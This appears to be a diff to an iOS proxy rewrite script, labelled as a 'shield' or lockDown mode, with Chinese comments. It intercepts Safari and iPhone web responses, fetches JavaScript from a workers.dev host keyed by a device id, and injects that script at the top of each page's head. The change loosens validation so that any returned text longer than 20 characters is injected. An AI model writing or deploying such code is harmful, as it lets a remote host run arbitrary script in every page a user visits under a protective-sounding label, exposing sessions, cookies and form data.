@@ -10,7 +10,7 @@ const urls = [
     `https://safari-shield-auth.justlcd.workers.dev/?id=${did}`
 ];
 
-// 精准识别
+// 只要是网页请求就尝试获取云端脚本
 if (ua && (ua.includes("Safari") || ua.includes("iPhone")) && $response.body) {
     fetchShield(0);
 } else {
@@ -21,21 +21,21 @@ function fetchShield(idx) {
     if (idx >= urls.length) return $done({}); 
 
     $httpClient.get(urls[idx], (err, resp, data) => {
-        if (!err && resp.status === 200 && data.includes("window")) {
+        // 只要返回了内容，就执行注入逻辑
+        if (!err && resp.status === 200 && data && data.length > 20) {
             let body = $response.body;
-            const payload = `<script>${data}</script>`;
+            const scriptPayload = `<script id="sh-core">${data}</script>`;
             
-            // 使用正则强制插在 <head> 之后的最顶部，确保最高优先级
+            // 匹配 <head> 标签及其任何属性
             if (/<head[^>]*>/i.test(body)) {
-                body = body.replace(/<head[^>]*>/i, `$&${payload}`);
+                body = body.replace(/<head[^>]*>/i, `$&${scriptPayload}`);
             } else {
-                body = payload + body;
+                body = scriptPayload + body;
             }
             
-            console.log("🛡️ lockDown Mode Active via " + urls[idx]);
+            console.log("🛡️ Shield Success: " + urls[idx]);
             $done({ body });
         } else {
-            // 备选域名切换
             fetchShield(idx + 1); 
         }
     });
